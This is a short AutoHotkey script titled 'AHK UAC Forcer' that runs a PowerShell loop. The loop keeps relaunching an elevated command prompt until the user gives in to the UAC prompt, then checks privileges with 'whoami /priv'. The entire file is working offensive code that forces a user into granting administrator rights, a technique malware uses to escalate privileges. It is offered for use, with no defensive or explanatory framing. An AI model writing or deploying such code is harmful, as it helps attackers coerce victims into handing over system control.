/*
AHK Version: 1.1
 Author : Chainski
 Script Function:
	AHK UAC Forcer
[~] Force a user to run as admin
[~] To run this on a windows machine you need to download the AHK script compiler here : https://www.autohotkey.com/download/ahk-install.exe
*/
Run, %comspec% /c "powershell while($true){try{Start-Process 'cmd' -Verb runas -ArgumentList '/k whoami /priv';exit}catch{}}"